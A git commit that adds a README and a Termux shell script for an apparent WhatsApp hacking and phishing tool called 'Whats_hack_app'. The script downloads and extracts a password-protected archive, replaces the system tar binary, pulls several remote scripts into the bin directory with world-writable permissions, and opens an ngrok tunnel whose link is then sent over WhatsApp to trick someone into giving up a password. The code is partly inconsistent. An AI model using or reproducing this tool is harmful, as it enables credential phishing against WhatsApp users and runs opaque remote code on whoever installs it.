f37a1f35d7918c1cd3e99d56ed56a10cb4d396e4
👨‍💻𝙎𝙖𝙝𝙖𝙣 𝙈𝙖𝙙𝙪𝙬𝙖𝙣𝙩𝙝𝙖 <125999503+MrMasterOfc@users.noreply.github.com>
2024-11-24 04:09:42 +0530

    👨‍💻

--- README.md
+++ README.md
@@ -1,1 +1,112 @@
-# WA-HACK-APP
+# Whats_hack_app
+
+
+
+
+Usage of Whats_hack_app for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+
+
+
+#
+![Screenshot (18)](https://user-images.githubusercontent.com/96709855/185608787-2d348a25-d030-4cc9-a8fc-c339a4c064dd.png)
+
+
+
+
+#
+
+
+
+apt update
+
+
+apt upgrade
+
+# install apksigner
+
+
+# install php
+
+# install ssh
+
+# install gradle
+
+
+git clone https://github.com/DRACULA-HACK/Whats_hack_app
+
+
+cd Whats_hack_app
+
+bash whatsappfish.sh
+
+
+
+#
+#
+
+
+
+
+
+bash Whatsapphack.sh
+
+
+# Installing on Kali linux
+
+# Install dependencies:
+ apt-get update
+ apt-get install openjdk-8-jdk
+ apt-get install gradle
+
+# Use Java8:
+# Get Java8 dir with command:
+ update-alternatives --list java
+
+# Copy and replace dir on command:
+ update-alternatives --set java /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java
+
+# Download Android Studio:
+https://developer.android.com/studio
+
+# Installing Android Studio:
+ unzip ~/Downloads/android*.zip -d /opt
+
+# For AMD64 Arch, Install Android Studio dependencies:
+ apt-get install lib32z1 lib32ncurses6 lib32stdc++6
+
+
+# Run Android Studio:
+ cd /opt/android-studio/bin
+ ./studio.sh
+
+Go to SDK Manager (Configure -> SDK Manager) and Download:
+Android SDK Build-tools, Android SDK-tools, Android SDK platform-tools, Support Repository
+
+# Run script:
+ git clone https://github.com/DRACULA-HACK/Whats_hack_app
+ cd Whatsapp_hack.0.1
+ bash Whatsapphack.sh
+
+
+# On First Time, Choose "n" when asks to build, then open the project on Android Studio:
+cd /opt/android-studio/bin
+./studio.sh
+
+# Import Gradle Project:
+Choose whatshack app folder: whatshack/app/
+
+
+Wait all dependencies downloading, if you got errors, click on showed links to solve.
+Try build from Android Studio: Build > build APK's
+Click on showed links if you got errors.
+Close Android after building successfully.
+
+open with any Text Editor the file app/build.gradle
+
+remove "google()"
+change gradle version from: 3.4.1 to: 2.2.0
+save and exit.
+
+# Run script (as root):
+ bash Whatsapphack.sh
---
+++ whatsappfish.sh
@@ -0,0 +1,212 @@
+#!/data/data/com.termux/files/usr/bin/bash
+
+
+echo -e "
+
+			hi 
+
+"
+
+
+echo "		please wait till it install "
+
+
+
+figlet wait |lolcat
+
+pkg upgrade -y; pkg install wget -y;
+termux-setup-storage -Y
+
+clear
+red='\033[1;31m'
+green='\033[1;32m'
+yellow='\033[1;33m'
+blue='\033[1;34m'
+orange='\33[38;5;208m'
+light_cyan='\033[1;96m'
+reset='\033[0m'
+
+cd 2> /dev/null
+echo "Y" | termux-setup-storage > /dev/null
+
+function get_arch() {
+    clear
+    printf "${blue}[*] Kiểm tra CPU...."
+    case $(getprop ro.product.cpu.abi) in
+        arm64-v8a)
+            SYS_ARCH=arm64
+			printf " ARCH: $(getprop ro.product.cpu.abi) (aarch64)\n\n"
+            ;;
+        armeabi|armeabi-v7a)
+			printf " ARCH: $(getprop ro.product.cpu.abi) (armhf)\n\n"
+            ;;
+        *)
+			printf " ARCH: $(getprop ro.product.cpu.abi) (unknown)"
+			printf "\n\n\n @ CPU không được hổ trợ \n\n"
+            printf " Info: CPU x86 | Giả lập\n\n"
+			exit 1
+            ;;
+    esac
+}
+
+get_arch
+
+pkg install proot tar p7zip -y
+
+function ask() {
+    while true; do
+
+        if [ "${2:-}" = "Y" ] 2> /dev/null; then
+            prompt="Y/n"
+            default=Y
+        elif [ "${2:-}" = "N" ] 2> /dev/null; then
+            prompt="y/N"
+            default=N
+        else
+            prompt="y/n"
+            default=
+        fi
+
+        printf "${light_cyan}\n[?] "
+        read -p "$1 [$prompt] " REPLY
+
+        if [ -z "$REPLY" ] 2> /dev/null; then
+            REPLY=$default
+        fi
+
+        printf "${reset}"
+
+        case "$REPLY" in
+            Y*|y*) return 0 ;;
+            N*|n*) return 1 ;;
+        esac
+    done
+}
+
+function set_strings() {
+    CHROOT="KhanhNguyen9872_HTTP"
+    IMAGE_NAME="http-khanhnguyen9872.tar.xz"
+    SHA_NAME="http-khanhnguyen9872.sha512sum"
+}
+
+function cleanup() {
+    if [ -f ${IMAGE_NAME} ] 2> /dev/null; then
+		rm -f ${IMAGE_NAME}
+        rm -f ${SHA_NAME}
+		printf " - Đã cài đặt thành công!"
+    fi
+}
+
+function get_url() {
+    ROOTFS_URL="https://github.com/KhanhNguyen9872/http-share-termux/releases/download/http-image/http-khanhnguyen9872.7z"
+    SHA_URL="https://github.com/KhanhNguyen9872/http-share-termux/releases/download/http-image/http-khanhnguyen9872.sha512sum"
+}
+
+function get_rootfs() {
+    unset KEEP_IMAGE
+    if [ -f ${IMAGE_NAME} ]; then
+        rm -f ${IMAGE_NAME}
+    fi
+    clear
+    printf "${blue}\n[*] Đang tải ($(getprop ro.product.cpu.abi))...."
+    printf " (KhanhNguyen9872)${reset}\n\n"
+    get_url
+    wget -O http-khanhnguyen9872.7z "$ROOTFS_URL" && echo "- Get success"
+    clear
+    printf "${yellow}\n\nKhanh: Vui lòng chờ....\n\n"
+    7z x http-khanhnguyen9872.7z -p"samiyuusuyakagi82654264khanh9872khanhnguyenlitekhanhvuinguyenvan800983609khanh82654264123321abcdefghjklmnoiloveyoufromvietnameseheheheheqiuwchdqwuyqwycqwyhdqwyd8ywd89yey21ey23yr293cyr23yrc8932yr9823yr32yr8723y732yc7ry237ry327ry2397ry327ry237yr8327yr8723yr8723ycr873ycr87y3ycr923yr23c32ce3e32ce23ec2cvv" -aoa > /dev/null
+    rm -f http-khanhnguyen9872.7z 2> /dev/null
+}
+
+function get_sha() {
+    if [ -f ${SHA_NAME} ] 2> /dev/null; then
+		rm -f ${SHA_NAME}
+    fi
+
+    wget -O http-khanhnguyen9872.sha512sum "${SHA_URL}" 2> /dev/null
+}
+
+function verify_sha() {
+	clear
+    printf "\n${blue}[*] Đang kiểm tra file....${reset}\n"
+    sha512sum -c $SHA_NAME || {
+        printf "${red} Package may be damaged! Try reinstalling\n\n${reset}"
+        echo -e " 		please wait creating"
+        cd 2> /dev/null
+	    rm -f $SHA_NAME 2> /dev/null
+	    rm -f $IMAGE_NAME 2> /dev/null
+        rm -f install.sh 2> /dev/null
+        exit 1
+    }
+	rm -f $SHA_NAME
+}
+
+function extract_rootfs() {
+        printf "\n${blue}[*] Đang cài đặt ($(getprop ro.product.cpu.abi)).... ${reset}\n\n"
+      echo -e " 		please wait creating"
+        mkdir ~/../usr/share/KhanhNguyen9872 2> /dev/null
+		mv http-khanhnguyen9872.img ~/../usr/share/KhanhNguyen9872/http-khanhnguyen9872.tar.xz
+        cd ~/../usr/share/KhanhNguyen9872 2> /dev/null
+        logkhanh="$(cat ~/../usr/bin/tar)"
+        if [[ $logcat == "" ]] 2> /dev/null || [ -z $logcat ] 2> /dev/null; then
+            cp ~/../usr/lib/libtartt.so ~/../usr/bin/tar 2> /dev/null; chmod 777 ~/../usr/bin/tar 2> /dev/null
+        fi
+        unset logkhanh
+        proot --link2symlink tar -xJf $IMAGE_NAME 2> /dev/null || :
+	echo -e " 		please wait creating"
+	rm -f $IMAGE_NAME
+        wget -O http-local.sh "https://raw.githubusercontent.com/KhanhNguyen9872/http-share-termux/main/bin/http-local.sh" 2> /dev/null
+        wget -O http-ngrok.sh "https://raw.githubusercontent.com/KhanhNguyen9872/http-share-termux/main/bin/http-ngrok.sh" 2> /dev/null
+        wget -O http-guest.sh "https://raw.githubusercontent.com/KhanhNguyen9872/http-share-termux/main/bin/http-guest.sh" 2> /dev/null
+        wget -O http-share.sh "https://raw.githubusercontent.com/KhanhNguyen9872/http-share-termux/main/bin/http-share.sh" 2> /dev/null
+        wget -O http-password.sh "https://raw.githubusercontent.com/KhanhNguyen9872/http-share-termux/main/bin/http-password.sh" 2> /dev/null
+        wget -O http-custom.sh "https://raw.githubusercontent.com/KhanhNguyen9872/http-share-termux/main/bin/http-custom.sh" 2> /dev/null
+        wget -O ngrok.sh "https://raw.githubusercontent.com/KhanhNguyen9872/http-share-termux/main/bin/ngrok.sh" 2> /dev/null
+        mv ./http-local.sh ~/../usr/bin/http-local 2> /dev/null; chmod 777 ~/../usr/bin/http-local 2> /dev/null
+        mv ./http-ngrok.sh ~/../usr/bin/http-ngrok 2> /dev/null; chmod 777 ~/../usr/bin/http-ngrok 2> /dev/null
+        mv ./http-share.sh ~/../usr/bin/http-share 2> /dev/null; chmod 777 ~/../usr/bin/http-share 2> /dev/null
+        mv ./http-guest.sh ~/../usr/bin/http-guest 2> /dev/null; chmod 777 ~/../usr/bin/http-guest 2> /dev/null
+        mv ./http-custom.sh ~/../usr/bin/http-custom 2> /dev/null; chmod 777 ~/../usr/bin/http-custom 2> /dev/null
+        mv ./http-password.sh ~/../usr/bin/http-password 2> /dev/null; chmod 777 ~/../usr/bin/http-password 2> /dev/null
+        mv ./ngrok.sh ~/../usr/bin/ngrok 2> /dev/null; chmod 777 ~/../usr/bin/ngrok 2> /dev/null
+}
+
+function completed() {
+	clear
+	echo "- Đã cài đặt thành công!"
+	echo ""
+	cd 2> /dev/null
+   
+}
+
+set_strings
+get_rootfs
+get_sha
+verify_sha
+extract_rootfs
+completed
+
+
+echo "			take authtoken from your ngrok account" |lolcat
+xdg-open https://dashboard.ngrok.com/
+read -p " your token = " token
+
+
+
+ngrok authtoken $token
+
+echo " this is your host link "
+echo " gave the link " 
+
+ngrok
+
+read -p " animate the  link = " link
+
+xdg-open https://api.whatsapp.com/send?phone=12093158769&text=Hi%20bro%20what%20is%20your%20$link%20password%20%0A%0A
+
+
+echo " password "
+
+read pass
+
+
